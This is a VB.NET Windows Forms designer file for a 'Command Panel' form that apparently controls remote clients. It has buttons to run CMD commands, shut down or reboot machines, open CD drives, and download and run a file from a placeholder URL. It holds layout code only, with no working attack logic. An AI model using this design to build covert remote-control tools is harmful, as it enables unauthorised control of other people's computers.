<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class CMD
    Inherits System.Windows.Forms.Form

    'Form reemplaza a Dispose para limpiar la lista de componentes.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requerido por el Diseñador de Windows Forms
    Private components As System.ComponentModel.IContainer

    'NOTA: el Diseñador de Windows Forms necesita el siguiente procedimiento
    'Se puede modificar usando el Diseñador de Windows Forms.  
    'No lo modifique con el editor de código.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(CMD))
        Me.Button1 = New System.Windows.Forms.Button()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.ListBox1 = New System.Windows.Forms.ListBox()
        Me.RadioButton1 = New System.Windows.Forms.RadioButton()
        Me.RadioButton2 = New System.Windows.Forms.RadioButton()
        Me.Button4 = New System.Windows.Forms.Button()
        Me.Button5 = New System.Windows.Forms.Button()
        Me.Button6 = New System.Windows.Forms.Button()
        Me.Button7 = New System.Windows.Forms.Button()
        Me.menuDownloadRunSomething = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.DownloadToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripTextBox1 = New System.Windows.Forms.ToolStripTextBox()
        Me.INFORemoteDirectoryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripTextBox2 = New System.Windows.Forms.ToolStripTextBox()
        Me.INFORawDownloadLinkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.STARTToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunDownloadedFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripTextBox3 = New System.Windows.Forms.ToolStripTextBox()
        Me.INFORemoteFileDirectoryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RUNToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.Button8 = New System.Windows.Forms.Button()
        Me.Button9 = New System.Windows.Forms.Button()
        Me.menuDownloadRunSomething.SuspendLayout()
        Me.SuspendLayout()
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(12, 34)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(111, 23)
        Me.Button1.TabIndex = 0
        Me.Button1.Text = "Open CD Drive"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(12, 60)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(111, 23)
        Me.Button2.TabIndex = 1
        Me.Button2.Text = "Close CD Drive"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(12, 89)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(111, 49)
        Me.Button3.TabIndex = 2
        Me.Button3.Text = "Run WinCMD Command"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'ListBox1
        '
        Me.ListBox1.Enabled = False
        Me.ListBox1.FormattingEnabled = True
        Me.ListBox1.Location = New System.Drawing.Point(391, 58)
        Me.ListBox1.Name = "ListBox1"
        Me.ListBox1.Size = New System.Drawing.Size(131, 277)
        Me.ListBox1.TabIndex = 3
        '
        'RadioButton1
        '
        Me.RadioButton1.AutoSize = True
        Me.RadioButton1.Checked = True
        Me.RadioButton1.Location = New System.Drawing.Point(373, 12)
        Me.RadioButton1.Name = "RadioButton1"
        Me.RadioButton1.Size = New System.Drawing.Size(69, 17)
        Me.RadioButton1.TabIndex = 4
        Me.RadioButton1.TabStop = True
        Me.RadioButton1.Text = "All clients"
        Me.RadioButton1.UseVisualStyleBackColor = True
        '
        'RadioButton2
        '
        Me.RadioButton2.AutoSize = True
        Me.RadioButton2.Location = New System.Drawing.Point(373, 35)
        Me.RadioButton2.Name = "RadioButton2"
        Me.RadioButton2.Size = New System.Drawing.Size(63, 17)
        Me.RadioButton2.TabIndex = 5
        Me.RadioButton2.Text = "Specific"
        Me.RadioButton2.UseVisualStyleBackColor = True
        '
        'Button4
        '
        Me.Button4.Location = New System.Drawing.Point(12, 144)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(111, 23)
        Me.Button4.TabIndex = 6
        Me.Button4.Text = "Shutdown Sys"
        Me.Button4.UseVisualStyleBackColor = True
        '
        'Button5
        '
        Me.Button5.Location = New System.Drawing.Point(12, 170)
        Me.Button5.Name = "Button5"
        Me.Button5.Size = New System.Drawing.Size(111, 23)
        Me.Button5.TabIndex = 7
        Me.Button5.Text = "Reboot Sys"
        Me.Button5.UseVisualStyleBackColor = True
        '
        'Button6
        '
        Me.Button6.Location = New System.Drawing.Point(12, 196)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(111, 23)
        Me.Button6.TabIndex = 8
        Me.Button6.Text = "Logoff Sys"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'Button7
        '
        Me.Button7.ContextMenuStrip = Me.menuDownloadRunSomething
        Me.Button7.Location = New System.Drawing.Point(12, 225)
        Me.Button7.Name = "Button7"
        Me.Button7.Size = New System.Drawing.Size(111, 49)
        Me.Button7.TabIndex = 9
        Me.Button7.Text = "Download/Run"
        Me.Button7.UseVisualStyleBackColor = True
        '
        'menuDownloadRunSomething
        '
        Me.menuDownloadRunSomething.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DownloadToolStripMenuItem, Me.RunToolStripMenuItem})
        Me.menuDownloadRunSomething.Name = "menuDownloadRunSomething"
        Me.menuDownloadRunSomething.Size = New System.Drawing.Size(129, 48)
        '
        'DownloadToolStripMenuItem
        '
        Me.DownloadToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripTextBox1, Me.INFORemoteDirectoryToolStripMenuItem, Me.ToolStripTextBox2, Me.INFORawDownloadLinkToolStripMenuItem, Me.STARTToolStripMenuItem})
        Me.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem"
        Me.DownloadToolStripMenuItem.Overflow = System.Windows.Forms.ToolStripItemOverflow.AsNeeded
        Me.DownloadToolStripMenuItem.ShortcutKeyDisplayString = ""
        Me.DownloadToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.DownloadToolStripMenuItem.Text = "Download"
        '
        'ToolStripTextBox1
        '
        Me.ToolStripTextBox1.Name = "ToolStripTextBox1"
        Me.ToolStripTextBox1.Size = New System.Drawing.Size(200, 23)
        Me.ToolStripTextBox1.Text = "C:\Users\%username%\Desktop\File"
        '
        'INFORemoteDirectoryToolStripMenuItem
        '
        Me.INFORemoteDirectoryToolStripMenuItem.Enabled = False
        Me.INFORemoteDirectoryToolStripMenuItem.Name = "INFORemoteDirectoryToolStripMenuItem"
        Me.INFORemoteDirectoryToolStripMenuItem.Size = New System.Drawing.Size(260, 22)
        Me.INFORemoteDirectoryToolStripMenuItem.Text = "INFO^ Remote directory"
        '
        'ToolStripTextBox2
        '
        Me.ToolStripTextBox2.BackColor = System.Drawing.Color.White
        Me.ToolStripTextBox2.Name = "ToolStripTextBox2"
        Me.ToolStripTextBox2.Size = New System.Drawing.Size(200, 23)
        Me.ToolStripTextBox2.Text = "http://domain.com/afile.txt"
        '
        'INFORawDownloadLinkToolStripMenuItem
        '
        Me.INFORawDownloadLinkToolStripMenuItem.Enabled = False
        Me.INFORawDownloadLinkToolStripMenuItem.Name = "INFORawDownloadLinkToolStripMenuItem"
        Me.INFORawDownloadLinkToolStripMenuItem.Size = New System.Drawing.Size(260, 22)
        Me.INFORawDownloadLinkToolStripMenuItem.Text = "INFO^ Direct download link"
        '
        'STARTToolStripMenuItem
        '
        Me.STARTToolStripMenuItem.Name = "STARTToolStripMenuItem"
        Me.STARTToolStripMenuItem.Size = New System.Drawing.Size(260, 22)
        Me.STARTToolStripMenuItem.Text = "S T A R T"
        '
        'RunToolStripMenuItem
        '
        Me.RunToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RunDownloadedFileToolStripMenuItem, Me.ToolStripMenuItem1, Me.ToolStripTextBox3, Me.INFORemoteFileDirectoryToolStripMenuItem, Me.RUNToolStripMenuItem1})
        Me.RunToolStripMenuItem.Name = "RunToolStripMenuItem"
        Me.RunToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.RunToolStripMenuItem.Text = "Run"
        '
        'RunDownloadedFileToolStripMenuItem
        '
        Me.RunDownloadedFileToolStripMenuItem.Name = "RunDownloadedFileToolStripMenuItem"
        Me.RunDownloadedFileToolStripMenuItem.Size = New System.Drawing.Size(260, 22)
        Me.RunDownloadedFileToolStripMenuItem.Text = "Run Downloaded File"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(257, 6)
        '
        'ToolStripTextBox3
        '
        Me.ToolStripTextBox3.Name = "ToolStripTextBox3"
        Me.ToolStripTextBox3.Size = New System.Drawing.Size(200, 23)
        Me.ToolStripTextBox3.Text = "C:\Users\%username%\Desktop"
        '
        'INFORemoteFileDirectoryToolStripMenuItem
        '
        Me.INFORemoteFileDirectoryToolStripMenuItem.Enabled = False
        Me.INFORemoteFileDirectoryToolStripMenuItem.Name = "INFORemoteFileDirectoryToolStripMenuItem"
        Me.INFORemoteFileDirectoryToolStripMenuItem.Size = New System.Drawing.Size(260, 22)
        Me.INFORemoteFileDirectoryToolStripMenuItem.Text = "INFO^ Remote file directory"
        '
        'RUNToolStripMenuItem1
        '
        Me.RUNToolStripMenuItem1.Name = "RUNToolStripMenuItem1"
        Me.RUNToolStripMenuItem1.Size = New System.Drawing.Size(260, 22)
        Me.RUNToolStripMenuItem1.Text = "R U N"
        '
        'Button8
        '
        Me.Button8.Location = New System.Drawing.Point(12, 280)
        Me.Button8.Name = "Button8"
        Me.Button8.Size = New System.Drawing.Size(111, 49)
        Me.Button8.TabIndex = 10
        Me.Button8.Text = "Say as CMD"
        Me.Button8.UseVisualStyleBackColor = True
        '
        'Button9
        '
        Me.Button9.Location = New System.Drawing.Point(174, 328)
        Me.Button9.Name = "Button9"
        Me.Button9.Size = New System.Drawing.Size(187, 22)
        Me.Button9.TabIndex = 11
        Me.Button9.Text = "Config File"
        Me.Button9.UseVisualStyleBackColor = True
        '
        'CMD
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(534, 362)
        Me.Controls.Add(Me.Button9)
        Me.Controls.Add(Me.Button8)
        Me.Controls.Add(Me.Button7)
        Me.Controls.Add(Me.Button6)
        Me.Controls.Add(Me.Button5)
        Me.Controls.Add(Me.Button4)
        Me.Controls.Add(Me.RadioButton2)
        Me.Controls.Add(Me.RadioButton1)
        Me.Controls.Add(Me.ListBox1)
        Me.Controls.Add(Me.Button3)
        Me.Controls.Add(Me.Button2)
        Me.Controls.Add(Me.Button1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "CMD"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Command Panel"
        Me.menuDownloadRunSomething.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents Button1 As Button
    Friend WithEvents Button2 As Button
    Friend WithEvents Button3 As Button
    Friend WithEvents ListBox1 As ListBox
    Friend WithEvents RadioButton1 As RadioButton
    Friend WithEvents RadioButton2 As RadioButton
    Friend WithEvents Button4 As Button
    Friend WithEvents Button5 As Button
    Friend WithEvents Button6 As Button
    Friend WithEvents Button7 As Button
    Friend WithEvents menuDownloadRunSomething As ContextMenuStrip
    Friend WithEvents DownloadToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripTextBox1 As ToolStripTextBox
    Friend WithEvents INFORemoteDirectoryToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripTextBox2 As ToolStripTextBox
    Friend WithEvents INFORawDownloadLinkToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunDownloadedFileToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As ToolStripSeparator
    Friend WithEvents ToolStripTextBox3 As ToolStripTextBox
    Friend WithEvents INFORemoteFileDirectoryToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RUNToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents STARTToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Button8 As Button
    Friend WithEvents Button9 As Button
End Class
